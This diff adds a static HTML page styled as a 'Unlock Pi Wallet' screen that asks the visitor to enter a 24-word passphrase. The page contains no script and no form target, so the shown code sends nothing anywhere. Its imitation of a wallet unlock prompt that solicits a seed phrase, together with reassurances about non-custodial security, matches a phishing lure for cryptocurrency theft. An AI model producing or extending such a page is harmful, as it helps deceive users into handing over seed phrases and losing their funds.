@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unlock Pi Wallet</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f8f8f8;
+            text-align: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 400px;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            margin: auto;
+        }
+        h2 {
+            color: #333;
+        }
+        textarea {
+            width: 100%;
+            height: 80px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            margin-top: 10px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .passphrase-btn {
+            background: #6A0DAD;
+            color: white;
+        }
+        .fingerprint-btn {
+            background: #4B0082;
+            color: white;
+        }
+        p {
+            font-size: 14px;
+            color: #666;
+        }
+        a {
+            color: #6A0DAD;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Unlock Pi Wallet</h2>
+        <textarea placeholder="Enter your 24-word passphrase here"></textarea>
+        <button class="passphrase-btn">Unlock With Passphrase</button>
+        <button class="fingerprint-btn">Unlock With Fingerprint</button>
+        <p>As a non-custodial wallet, your passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
+        <p>Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.</p>
+    </div>
+
+</body>
+</html>
